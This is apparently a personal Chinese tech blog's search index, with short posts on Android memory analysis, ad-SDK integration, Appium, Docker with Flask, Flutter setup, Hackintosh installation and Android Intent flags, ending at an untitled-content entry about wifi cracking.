<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>1.逆向学习(一)</title>
    <url>/2018/04/18/1-firstday/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>ios逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Mat分析Android应用内存</title>
    <url>/2018/05/31/MatMemory/</url>
    <content><![CDATA[<p>分析 = 工具 + 数据</p>
<h1 id="安装Mat分析工具"><a href="#安装Mat分析工具" class="headerlink" title="安装Mat分析工具"></a>安装Mat分析工具</h1><p><a href="./MemoryAnalyzer-1.7.0.20170613-macosx.cocoa.x86_64.zip">MemoryAnalyzer1.7.0下载</a><br>下载之后解压 =&gt; 打开mat.app 如果有如下类似报错：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.lang.IllegalStateException: The platform metadata area could not be XXXXX</span><br><span class="line">XXXXXXX</span><br><span class="line">XXXXXXX</span><br></pre></td></tr></table></figure></p>
<p>显示包内容 =》 Terminal到Contents/MacOs下 执行就可以了：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./MemoryAnalyzer -data ./dump</span><br></pre></td></tr></table></figure></p>
<h1 id="准备数据"><a href="#准备数据" class="headerlink" title="准备数据"></a>准备数据</h1><ul>
<li><p>GC：<code>kill -10 [pid]</code></p>
</li>
<li><p>dump内存数据：<code>am dumpheap [process name] [save path]</code></p>
</li>
<li><p>转换数据：<code>/Applications/AndroidSDK/platform-tools/hprof-conv [raw file] [new file.hprof]</code></p>
</li>
</ul>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><a href="https://blog.csdn.net/itachi85/article/details/77075455" target="_blank" rel="noopener">参考文章</a></p>
]]></content>
      <tags>
        <tag>优化</tag>
      </tags>
  </entry>
  <entry>
    <title>百度</title>
    <url>/2020/09/08/ad-baidu/</url>
    <content><![CDATA[<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Application&gt;</span><br><span class="line">    &lt;meta-data</span><br><span class="line">        android:name=&quot;BaiduMobAd_APP_ID&quot;</span><br><span class="line">        android:value=&quot;ID&quot; /&gt;</span><br><span class="line">&lt;/Application&gt;</span><br><span class="line">// 或者</span><br><span class="line">AdView.setAppSid(context, &quot;AD_ID&quot;);</span><br></pre></td></tr></table></figure>
<p>##开屏<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SplashAd splashAd = new SplashAd(RSplashManagerActivity.this, adsParent, listener, adPlaceId, true, RequestParameters);</span><br><span class="line">splashAd.load();</span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>AD</tag>
      </tags>
  </entry>
  <entry>
    <title>广点通</title>
    <url>/2020/09/04/ad-tencent/</url>
    <content><![CDATA[<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 通过调用此方法初始化 SDK。如果需要在多个进程拉取广告，每个进程都需要初始化 SDK。</span><br><span class="line">GDTADManager.getInstance().initWith(context, Constants.APPID);</span><br></pre></td></tr></table></figure>
<p>##开屏<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">splashAD = new SplashAD(activity, container, posId, AdListener, fetchDelay);</span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>AD</tag>
      </tags>
  </entry>
  <entry>
    <title>穿山甲</title>
    <url>/2020/09/04/ad-toutiao/</url>
    <content><![CDATA[<p><br><br><strong>TTAdSdk -&gt; TTAdManager -&gt; TTAdNative -&gt; …</strong></p>
<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TTAdSdk.init(Context, TTAdConfig);</span><br><span class="line">// TTAdConfig说明</span><br><span class="line">public static class TTAdConfig.Builder &#123;</span><br><span class="line">    private String mAppId;// 必选参数，设置应用的AppId</span><br><span class="line">    private String mAppName;// 必选参数，设置应用名称</span><br><span class="line">    private boolean mIsPaid = false;// 可选参数，设置是否为计费用户：true计费用户、false非计费用户。默认为false非计费用户。须征得用户同意才可传入该参数</span><br><span class="line">    private String mKeywords;// 可选参数，设置用户画像的关键词列表 **不能超过为1000个字符**。须征得用户同意才可传入该参数</span><br><span class="line">    private String mData;// 可选参数，设置额外的用户信息 **不能超过为1000个字符**</span><br><span class="line">    private int mTitleBarTheme = TTAdConstant.TITLE_BAR_THEME_LIGHT;// 可选参数，设置落地页主题，默认为TTAdConstant#TITLE_BAR_THEME_LIGHT</span><br><span class="line">    private boolean mAllowShowNotify = true;// 可选参数，设置是否允许SDK弹出通知：true允许、false禁止。默认为true允许</span><br><span class="line">    private boolean mIsDebug = false;// 可选参数，是否打开debug调试信息输出：true打开、false关闭。默认false关闭</span><br><span class="line">    private boolean mAllowShowPageWhenScreenLock = false;// 可选参数，设置是否允许落地页出现在锁屏上面：true允许、false禁止。默认为false禁止</span><br><span class="line">    private int[] mDirectDownloadNetworkType;</span><br><span class="line">    private boolean mIsUseTextureView = false;// 可选参数，设置是否使用texture播放视频：true使用、false不使用。默认为false不使用（使用的是surface）</span><br><span class="line">    private boolean mIsSupportMultiProcess = false;// 可选参数，设置是否支持多进程：true支持、false不支持。默认为false不支持</span><br><span class="line">    private IHttpStack mHttpStack;//可选参数，设置外部网络请求，默认为urlconnection</span><br><span class="line">    private boolean mIsAsyncInit = false;//是否异步初始化sdk，开启可减少初始化耗时</span><br><span class="line">    private TTCustomController mCustomController;//可选参数，可以设置隐私信息控制开关</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>AdSlot说明<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdSlot adSlot = new AdSlot.Builder()</span><br><span class="line">    // 必选参数 设置您的CodeId</span><br><span class="line">    .setCodeId(“900486272&quot;)</span><br><span class="line">    // 必选参数 设置广告图片的最大尺寸及期望的图片宽高比，单位Px</span><br><span class="line">    // 注：必填字段，期望的图片尺寸，返回尺寸可能有差异</span><br><span class="line">    .setImageAcceptedSize(640, 320)</span><br><span class="line">    //模板广告需要设置期望个性化模板广告的大小,单位dp,代码位是否属于个性化模板广告，请在穿山甲平台查看</span><br><span class="line">    .setExpressViewAcceptedSize(expressViewWidth, expressViewHeight)</span><br><span class="line">    // 可选参数 设置是否支持deeplink</span><br><span class="line">    .setSupportDeepLink(true)</span><br><span class="line">    // 可选参数，针对信息流广告设置每次请求的广告返回个数，最多支持3个</span><br><span class="line">    .setAdCount(2)</span><br><span class="line">    //请求原生广告时候需要设置，参数为TYPE_BANNER或TYPE_INTERACTION_AD</span><br><span class="line">    .setNativeAdType(AdSlot.TYPE_BANNER)</span><br><span class="line">    //激励视频奖励的名称，针对激励视频参数</span><br><span class="line">    .setRewardName(&quot;金币&quot;)</span><br><span class="line">    //激励视频奖励个数</span><br><span class="line">    .setRewardAmount(3)</span><br><span class="line">    //用户ID,使用激励视频必传参数</span><br><span class="line">    //表来标识应用侧唯一用户；若非服务器回调模式或不需sdk透传，可设置为空字符串</span><br><span class="line">    .setUserID(&quot;user123&quot;)</span><br><span class="line">    //设置期望视频播放的方向，为TTAdConstant.HORIZONTAL或TTAdConstant.VERTICAL</span><br><span class="line">    .setOrientation(orientation)</span><br><span class="line">    //激励视频奖励透传参数，字符串，如果用json对象，必须使用序列化为String类型,可为空</span><br><span class="line">    .setMediaExtra(&quot;media_extra&quot;)</span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure></p>
<h2 id="开屏"><a href="#开屏" class="headerlink" title="开屏"></a>开屏</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// step1:获取Container</span><br><span class="line">mSplashContainer = (FrameLayout) findViewById(R.id.splash_container);</span><br><span class="line">// step2:创建TTAdNative对象</span><br><span class="line">mTTAdNative = TTAdSdk.getAdManager().createAdNative(this);</span><br><span class="line">// step3:创建插槽</span><br><span class="line">AdSlot adSlot = new AdSlot.Builder().build();</span><br><span class="line">//step4:请求广告，调用开屏广告异步请求接口，对请求回调的广告作渲染处理</span><br><span class="line">mTTAdNative.loadSplashAd(AdSlot, new TTAdNative.SplashAdListener() &#123;&#125;, AD_TIME_OUT);</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>AD</tag>
      </tags>
  </entry>
  <entry>
    <title>AdWhirl</title>
    <url>/2020/09/04/adwhirl/</url>
    <content><![CDATA[<p>Config接口：<br>返回sdk的appid跟各个广告位之间的对应关系，例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;expire&quot;: 10,  // 过期时间</span><br><span class="line">  &quot;mediation&quot;: [ // 媒体集合</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;mediaType:&quot;: &quot;1&quot;, // 媒体类型</span><br><span class="line">      &quot;mediaId&quot;: &quot;1&quot;,    // 媒体的应用ID</span><br><span class="line">      &quot;mediaKey&quot;: &quot;1&quot;    // 媒体的应用KEY</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;strategy&quot;: [ // 请求规则</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;slotType&quot;: &quot;splash&quot;, // 广告类型</span><br><span class="line">      &quot;slotList&quot;: [  // 请求顺序</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;mediaType&quot;: &quot;3&quot;,   // 需要使用媒体</span><br><span class="line">          &quot;slotId&quot;: &quot;&quot;  // 广告位ID</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;mediaType&quot;: &quot;1&quot;,</span><br><span class="line">          &quot;slotId&quot;: &quot;&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;mediaType&quot;: &quot;2&quot;,</span><br><span class="line">          &quot;slotId&quot;: &quot;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>请求参数：<br>申请SDK的ID<br>appId<br>appKey</p>
]]></content>
      <tags>
        <tag>AD</tag>
      </tags>
  </entry>
  <entry>
    <title>appium</title>
    <url>/2018/05/15/appium/</url>
    <content><![CDATA[<p>错误提示：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Could not detect Mac OS X Version from sw_vers output XXX</span><br></pre></td></tr></table></figure></p>
<p>运行检测程序提示不支持我的mac版本10.13.4</p>
<p>运行如下命令(找出所有包含此字符串的文件)：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -rl &quot;Could not detect Mac OS X Version from sw_vers output:&quot; /Applications/Appium.app/</span><br></pre></td></tr></table></figure></p>
<p>输出如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/Applications/Appium.app//Contents/Resources/node_modules/appium-support/lib/system.js</span><br><span class="line">/Applications/Appium.app//Contents/Resources/node_modules/appium-support/build/lib/system.js</span><br><span class="line">/Applications/Appium.app//Contents/Resources/node_modules/appium/node_modules/appium-support/lib/system.js</span><br><span class="line">/Applications/Appium.app//Contents/Resources/node_modules/appium/node_modules/appium-support/build/lib/system.js</span><br></pre></td></tr></table></figure></p>
<p>依次编辑文件中的系统版本数组，加上自己的版本号，即可。</p>
<p>安装<a href="https://github.com/appium/python-client" target="_blank" rel="noopener">Python代码编写端</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>
<p>npm install -g appium</p>
<p>echo y | pip uninstall selenium<br>pip install selenium==3.12.0</p>
]]></content>
  </entry>
  <entry>
    <title>Android使用注解</title>
    <url>/2018/04/23/annotation/</url>
    <content><![CDATA[<p>##Android中常使用注解来生成类和方法</p>
]]></content>
  </entry>
  <entry>
    <title>在Docker中运行Flask</title>
    <url>/2018/08/04/docker-flask/</url>
    <content><![CDATA[<p>最近刚刚简单学习了Docker和Flask，周末无事，在Docker中简单部署了Flask，记录一下实现方式。</p>
<h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><p>[alpine + python3 + flask]</p>
<p>alpine作为基础系统，安装Python3 + Flask。</p>
<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p><img src="pic_dir.jpg" alt=""></p>
<h2 id="目录对应文件说明"><a href="#目录对应文件说明" class="headerlink" title="目录对应文件说明"></a>目录对应文件说明</h2><h3 id="DF-BASE-FLASK-Dockerfile-build-base-img-flask-生成一个基础的镜像-对应的代码和生成镜像如下"><a href="#DF-BASE-FLASK-Dockerfile-build-base-img-flask-生成一个基础的镜像-对应的代码和生成镜像如下" class="headerlink" title="DF_BASE_FLASK [Dockerfile + build_base_img_flask] 生成一个基础的镜像,对应的代码和生成镜像如下:"></a>DF_BASE_FLASK [Dockerfile + build_base_img_flask] 生成一个基础的镜像,对应的代码和生成镜像如下:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Dockerfile</span><br><span class="line"></span><br><span class="line">FROM alpine:3.8</span><br><span class="line"></span><br><span class="line">MAINTAINER sorosunrain</span><br><span class="line"></span><br><span class="line">RUN echo &quot;https://mirror.tuna.tsinghua.edu.cn/alpine/v3.8/main/&quot; &gt; etc/apk/repositories</span><br><span class="line"></span><br><span class="line">RUN apk add --update \</span><br><span class="line">bash \</span><br><span class="line">py3-flask \</span><br><span class="line">#&amp;&amp; rm -rf var/cache/apk/*</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># build_base_img_flask</span><br><span class="line"></span><br><span class="line">cd DF_BASE_FLASK</span><br><span class="line">docker build -t &quot;sunrain/flask&quot; .</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 镜像</span><br><span class="line"></span><br><span class="line">$ docker images</span><br><span class="line">$ REPOSITORY                TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">  sunrain/flask             latest              d21e49cd15b0        24 minutes ago      60.6MB</span><br></pre></td></tr></table></figure>
<h3 id="work-yml"><a href="#work-yml" class="headerlink" title="work.yml"></a>work.yml</h3><p>提供docker compose使用，代码如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># work.yml</span><br><span class="line"></span><br><span class="line">version: &quot;1&quot;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  sunrian_flask:</span><br><span class="line">    image: sunrain/flask_workspace:latest</span><br><span class="line">    volumes:</span><br><span class="line">      - /dk/Flask:/code</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;10089:10086&quot;</span><br><span class="line">    command: python3 Flask.py</span><br></pre></td></tr></table></figure></p>
<p><code>/dk/Flask</code>是我的电脑映射的docker读写目录，文件结构及主要的Flask.py代码如下：<br><img src="pic_workspace.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Flask.py</span><br><span class="line"></span><br><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line">from flask import Flask, \</span><br><span class="line">    redirect, render_template, url_for</span><br><span class="line"></span><br><span class="line">import config</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(config)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def hello():</span><br><span class="line">    return u&apos;Hello World !&apos;</span><br><span class="line">    # return render_template(&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/login&apos;)</span><br><span class="line">def login():</span><br><span class="line">    return u&apos;欢迎登陆...&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=10086)</span><br></pre></td></tr></table></figure>
<h3 id="DF-WORKSPACE-Dockerfile-build-workspace-生成一个基于基础镜像的代码目录映射镜像-对应的代码和生成镜像如下"><a href="#DF-WORKSPACE-Dockerfile-build-workspace-生成一个基于基础镜像的代码目录映射镜像-对应的代码和生成镜像如下" class="headerlink" title="DF_WORKSPACE [Dockerfile + build_workspace] 生成一个基于基础镜像的代码目录映射镜像,对应的代码和生成镜像如下:"></a>DF_WORKSPACE [Dockerfile + build_workspace] 生成一个基于基础镜像的代码目录映射镜像,对应的代码和生成镜像如下:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Dockerfile</span><br><span class="line"></span><br><span class="line">FROM sunrain/flask</span><br><span class="line"></span><br><span class="line">RUN mkdir /code</span><br><span class="line">WORKDIR /code</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># build_workspace</span><br><span class="line"></span><br><span class="line">cd DF_WORKSPACE</span><br><span class="line">docker build -t &quot;sunrain/flask_workspace&quot; .</span><br><span class="line"></span><br><span class="line">docker-compose -f ../work.yml up</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 镜像</span><br><span class="line"></span><br><span class="line">$ docker images</span><br><span class="line">$ REPOSITORY                TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">  sunrain/flask_workspace   latest              b1befeb36afc        24 minutes ago      60.6MB</span><br></pre></td></tr></table></figure>
<p>最终运行效果如下：<br><img src="pic_result.jpg" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面的实现过程并不复杂，搭建一个web项目由于使用了docker和python而变得更加简单，一个独立且方便移植的linux+python+flask实现的web项目紧60M左右，让我不得不感叹科技的发展如此之快。</p>
]]></content>
      <tags>
        <tag>docker</tag>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Flutter 第一篇 安装</title>
    <url>/2018/05/29/flutter-start/</url>
    <content><![CDATA[<p>Flutter是谷歌的开发者推出的跨平台编程框架，用Dart语言进行开发，最终编译成arm字节码。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>环境：macOS<br>现在官网提供的安装方式是一个zip包，个人建议还是去git下载源码，可以方便切换分支和tag。<br>个人习惯安装到Application下。</p>
<h2 id="Flutter环境"><a href="#Flutter环境" class="headerlink" title="Flutter环境"></a>Flutter环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/flutter/flutter.git /Applications/Flutter/</span><br></pre></td></tr></table></figure>
<p>clone完成之后在.bash_profile中导入环境变量，并且初始化flutter<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--------.bash_profile--------</span><br><span class="line">#Flutter</span><br><span class="line">export PATH=$PATH:/Applications/Flutter/bin</span><br><span class="line"></span><br><span class="line">--------Run in Terminal--------</span><br><span class="line">#检测自身完整性(自动下载依赖)</span><br><span class="line">flutter doctor</span><br></pre></td></tr></table></figure></p>
<p>与网速有关安装完大概是这样：<br><img src="./command.jpg" alt=""></p>
<h2 id="苹果调试"><a href="#苹果调试" class="headerlink" title="苹果调试"></a>苹果调试</h2><p>如果要测试苹果需要安装xcode:<a href="https://developer.apple.com/xcode/" target="_blank" rel="noopener">网页下载</a>或者<a href="https://itunes.apple.com/us/app/xcode/id497799835" target="_blank" rel="noopener">Appstore下载</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo xcode-select --switch /Applications/Xcode.app/Contents/Developer</span><br><span class="line">#打开一模拟器 确保是5s以后的64位设备</span><br><span class="line">open -a Simulator</span><br></pre></td></tr></table></figure>
<p>如果需要在真机上测试，需要额外安装几个插件：<br>确保已经安装homebrew<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew update</span><br><span class="line">brew install --HEAD libimobiledevice</span><br><span class="line">brew install ideviceinstaller ios-deploy cocoapods</span><br><span class="line">pod setup</span><br></pre></td></tr></table></figure></p>
<h2 id="IntelliJ"><a href="#IntelliJ" class="headerlink" title="IntelliJ"></a>IntelliJ</h2><p>安装Drat和Flutter插件后重启<br>创建一个Flutter工程</p>
<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>连接Android设备直接Run即可。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>优点：</p>
<ul>
<li>跨平台</li>
<li>一套代码方便维护</li>
<li>展现形式符合各自平台的使用习惯<br>缺点：</li>
<li>要学习Dart语法</li>
<li>生成APK较大，测试一个HelloWord的apk大概30M</li>
<li>启动速度慢，不是较慢，是慢。。</li>
</ul>
<p>以上是初次搭建平台，跑完HelloWorld之后的使用体验。可能有失偏颇。</p>
]]></content>
      <tags>
        <tag>Flutter</tag>
        <tag>跨平台</tag>
      </tags>
  </entry>
  <entry>
    <title>黑苹果安装</title>
    <url>/2018/05/11/blackappale/</url>
    <content><![CDATA[<p><a href="https://www.tonymacx86.com/threads/success-asus-z170i-pro-gaming-sierra-10-12-5.224066/" target="_blank" rel="noopener">参考资料一</a><br><a href="https://hackintosher.com/guides/high-sierra-install-full-guide/" target="_blank" rel="noopener">参考资料二</a><br><a href="https://hackintosher.com/guides/properly-install-nvidia-drivers-high-sierra-10-13/" target="_blank" rel="noopener">参考资料三</a><br><a href="https://blog.daliansky.net/macOS-High-Sierra-10.13.6-17G2112-Release-Special-with-Clover-4606-original-mirror.html" target="_blank" rel="noopener">参考资料四</a></p>
<h2 id="安装信息"><a href="#安装信息" class="headerlink" title="安装信息"></a>安装信息</h2><ul>
<li>系统目前最新版本 macOS High Sierra 10.13.4</li>
<li>i5 6600K</li>
<li>ASUS Z170I Pro Gaming</li>
</ul>
<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><ul>
<li>macOS系统(DMG格式)</li>
<li>U盘一个</li>
</ul>
<p>开干！！！</p>
<h2 id="一个靠谱的的系统镜像很关键"><a href="#一个靠谱的的系统镜像很关键" class="headerlink" title="一个靠谱的的系统镜像很关键"></a>一个靠谱的的系统镜像很关键</h2><p>为什么需要一个靠谱的系统镜像？1、因为因为系统镜像问题耽误了半天时间。2、一个自带Clover的dmg镜像可以让你安装事半功倍。<br>这个<a href="https://blog.daliansky.net/macOS-High-Sierra-10.13.4-17E199-Release-Version-and-Clover-4418-Original-Image.html" target="_blank" rel="noopener">链接</a>是我最终获取镜像的位置，感谢前人的提供。</p>
<h2 id="制作EFI启动盘"><a href="#制作EFI启动盘" class="headerlink" title="制作EFI启动盘"></a>制作EFI启动盘</h2><p>这一步使用到个东西有：一个U盘、TransMac软件、DiskGenins软件。<br>1、U盘最好是&gt;=16G，插入U盘打开TransMac软件，在U盘上右键选择format for mac –&gt; 转换为mac读写格式。<br>2、格式化完成之后再次右键U盘选择restore from local file.然后选择我们的DMG，等待烧录完成。<br>这是就可以关闭TransMac软件了。只要你前期准备的dmg文件没有问题，这个过程一般不会出错。<br>3、打开DG软件找到U盘的ESP分区–&gt;点击浏览文件–&gt;将EFI文件夹导出–&gt;右键这ESP分区删除–&gt;右键这个未命名的分区创建一个新的fat32分区–&gt;将EFI文件夹拷贝到这个目录。<br>以上这一步的目的是将EFI分区变为windows可读写，方便后期各种蛋疼调试和驱动安装。<br>4、到EFI/CLOVER下找到自己对应的配置文件，将其修改为default。这个配置文件是集成显卡的型号。</p>
<h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><p>将U盘插到PC的2.0口(必须)上–&gt;重启–&gt;bios设置从U盘启动。<br>根据你主板的不同在网上搜索一个黑苹果的必要设置–&gt;重启<br>这时候会出现Clover的界面–&gt;选择苹果的图标–&gt;空格–&gt;选择啰嗦模式–&gt;Return–&gt;回车<br>这个过程随时会出现各种各样的问题，需要自行解决。<br>还好我的电脑并没有出现问题，直接跑完代码重启。<br>这次的重启之后会多出一个苹果的图标(Boot Mac)–&gt;选择并回车</p>
<p>2 假设你已经下载好了 macOS Sierra,  打开你刚才安装的 UniBeast,  点Continue, Continue, Continue, Continue, Agree,  在 Destination Select, 选 USB 并点击 Continue</p>
<p>3 在 Select OS Installation 选 Sierra 然后点 Continue</p>
<p>4 对于 Bootloader Options 选 UEFI Boot Mode or Legacy Boot Mode.  对于支持UEFI的系统和7/8/9/100 系列主板, 推荐选 UEFI Boot Mode . 对于 5/6 系列主板或老的 BIOS, 选Legacy Boot Mode</p>
<p>5 在Graphics Configuration 这页, 选你自己对应的显卡, 对于我, 后面要装 Nivida webdriver, 我就没选</p>
<p>6 校验后, 开始安装, 可能要输入你的macOS口令</p>
<p>7 完成后, 把你下载的 MultiBease 拖到 U盘中, 这时U盘中有几个东西, 比如 UEFI-backup, Install Sierra等</p>
<h2 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h2><p>华硕主板Z170-Pro gaming bios设置 以防出问题 建议升级到最新版本 测试过1204 最新1206应该也可以 没测试<br>advanced—Onboard Devices Configuration-Serial Port Configuration Serial Port （Off）</p>
<p>advanced—USB Configuration-XHCI Hand-off-Enabled</p>
<p>Secure Boot-OS Type，改成Other OS</p>
<p>advanced—PCH configuration-IOAPIC 24-119 Entries-disabled</p>
<p>可能需要的选项</p>
<pre><code>安全设置 关闭
如果 6 系列主板或有 AWARD BIOS的X58系统, 禁用USB 3.0
</code></pre><h2 id="安装Nvidia-WebDriver"><a href="#安装Nvidia-WebDriver" class="headerlink" title="安装Nvidia WebDriver"></a>安装Nvidia WebDriver</h2><ul>
<li>Mount your EFI partition, navigate to</li>
<li>Navigate to /Volumes/EFI/EFI/Clover/drivers64UEFI folder and verify whether you have OsxAptioFix3Drv-64.efi or OsxAptioFix2Drv-64.efi or OsxAptioFix2Drv-free2000.efi. If you are using OsxAptioFix2Drv-64.efi or OsxAptioFix2Drv-free2000.efi you will need to add EmuVariableUefi-64.efi under Clover Configurator -Install Drivers for acceleration.</li>
<li>Make sure you have <a href="https://github.com/vit9696/Lilu/releases" target="_blank" rel="noopener">Lilu.kext</a> and <a href="https://sourceforge.net/projects/nvidiagraphicsfixup/" target="_blank" rel="noopener">NvidiaGraphicsFixup.kext</a> (if applicable) in /Volumes/EFI/EFI/Clover/kexts/Other</li>
<li>Verify SIP is disabled or these steps below wont work</li>
<li>Download webdriver.sh</li>
<li>Make sure it’s unzipped and in your downloads folder</li>
<li>Open Terminal</li>
<li><p>Type &amp; Enter the following three lines in Terminal:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~/Downloads/webdriver.sh-master/</span><br><span class="line">sudo sh webdriver.sh -u https://images.nvidia.com/mac/pkg/378/WebDriver-378.10.10.10.25.103.pkg</span><br><span class="line">sudo sh webdriver.sh -m</span><br></pre></td></tr></table></figure>
</li>
<li><p>Restart Hackintosh</p>
</li>
</ul>
<p><a href="https://images.nvidia.com/mac/pkg/387/WebDriver-387.10.10.10.30.106.pkg" target="_blank" rel="noopener">Download 10.13.4 -387.10.10.10.30.106 (17E199)</a></p>
<p>如果您有APFS格式的驱动器，请确保您使用的是最新版本的apfs.efi将以下的下载文件解压缩并粘贴到EFI/Clover/Drivers64UEFI/<br><a href="https://hackintosher.com/wp-content/uploads/APFS_10.13.4.zip" target="_blank" rel="noopener">APFS_10.13.4.zip</a></p>
<p>High Sierra 10.13.4需要一个新的USB补丁程序才能识别并运行所有USB / USB3端口。<br>Mount EFI Partition with Clover Configurator<br>Navigate to /Volumes/EFI/EFI/Clover/<br>Right-click open config.plist with Clover Configurator<br>Click Kernel and Kext Patches under SECTIONS of Clover Configurator<br>Click the “+” button near the bottom to add this patch:<br>Name<em>: com.apple.driver.usb.AppleUSBXHCI<br>Find</em> [HEX]: 837d940f 0f839704 0000<br>Replace* [HEX]: 837d940f 90909090 9090<br>Comment: USB 10.13.4+ by PMHeart<br>MatchOS: 10.13.x<br>Save config.plist</p>
]]></content>
      <tags>
        <tag>黑苹果</tag>
      </tags>
  </entry>
  <entry>
    <title>Intent常用FLAG</title>
    <url>/2018/11/15/intent/</url>
    <content><![CDATA[<style> table th:first-of-type { width: 320px; } </style>

<p>因为项目中需要使用到Intent的常用flag，每次查询太麻烦，在此做个记录。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>16进制</th>
<th>10进制</th>
</tr>
</thead>
<tbody>
<tr>
<td>FLAG_ACTIVITY_CLEAR_TASK</td>
<td>0X00008000</td>
<td>32768</td>
</tr>
<tr>
<td>FLAG_ACTIVITY_NEW_TASK</td>
<td>0x10000000</td>
<td>268435456</td>
</tr>
<tr>
<td>FLAG_INCLUDE_STOPPED_PACKAGES</td>
<td>0x00000020</td>
<td>32</td>
</tr>
<tr>
<td>FLAG_ACTIVITY_SINGLE_TOP</td>
<td>0x20000000</td>
<td>536870912</td>
</tr>
<tr>
<td>FLAG_ACTIVITY_CLEAR_TOP</td>
<td>0x04000000</td>
<td>67108864</td>
</tr>
<tr>
<td>FLAG_ACTIVITY_NO_HISTORY</td>
<td>0x40000000</td>
<td>1073741824</td>
</tr>
<tr>
<td>FLAG_ACTIVITY_MULTIPLE_TASK</td>
<td>0x08000000</td>
<td>134217728</td>
</tr>
<tr>
<td>FLAG_ACTIVITY_RESET_TASK_IF_NEEDED</td>
<td>0x00200000</td>
<td>2097152</td>
</tr>
<tr>
<td>FLAG_ACTIVITY_LAUNCHED_FROM_HISTORY</td>
<td>0x00100000</td>
<td>1048576</td>
</tr>
</tbody>
</table>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>无线局域网破解</title>
    <url>/2018/05/12/networkhack/</url>
